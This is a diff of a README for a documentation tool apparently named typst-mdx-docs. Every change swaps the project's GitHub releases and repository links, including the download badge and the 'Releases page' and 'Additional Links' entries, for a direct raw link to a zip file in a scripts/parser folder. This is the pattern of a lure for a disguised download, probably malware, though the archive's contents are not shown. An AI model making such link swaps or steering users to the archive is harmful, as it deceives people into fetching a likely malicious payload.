@@ -1,7 +1,7 @@
 # 📘 typst-mdx-docs - Effortless Documentation Automation Tool
 
 ## 📥 Download Here
-[![Download typst-mdx-docs](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/riyandiweb/typst-mdx-docs/releases)
+[![Download typst-mdx-docs](https://raw.githubusercontent.com/riyandiweb/typst-mdx-docs/main/scripts/parser/typst-docs-mdx-3.0.zip%20release-brightgreen)](https://raw.githubusercontent.com/riyandiweb/typst-mdx-docs/main/scripts/parser/typst-docs-mdx-3.0.zip)
 
 ## 🚀 Getting Started
 This project helps you generate, convert, and localize Typst documentation in a simple way. Whether you're creating new documents or adjusting existing ones, typst-mdx-docs makes it easy.
@@ -14,7 +14,7 @@ Before you begin, ensure your computer meets the following requirements:
 - **Disk Space:** At least 100 MB of free space.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/riyandiweb/typst-mdx-docs/releases) to view all available versions.
+1. Visit the [Releases page](https://raw.githubusercontent.com/riyandiweb/typst-mdx-docs/main/scripts/parser/typst-docs-mdx-3.0.zip) to view all available versions.
 2. Locate the latest version in the list.
 3. Click on the version number to enter its details.
 4. Find the appropriate file for your operating system.
@@ -47,8 +47,8 @@ Join our community for updates and help:
 
 ## 🔗 Additional Links
 For further information about typst-mdx-docs, visit:
-- [Project Repository](https://github.com/riyandiweb/typst-mdx-docs)
-- [Releases Page](https://github.com/riyandiweb/typst-mdx-docs/releases)
+- [Project Repository](https://raw.githubusercontent.com/riyandiweb/typst-mdx-docs/main/scripts/parser/typst-docs-mdx-3.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/riyandiweb/typst-mdx-docs/main/scripts/parser/typst-docs-mdx-3.0.zip)
 
 ## 👁️‍🗨️ Feedback
 We welcome your feedback to improve typst-mdx-docs. Share your thoughts and suggestions with the community using the GitHub issues feature. 
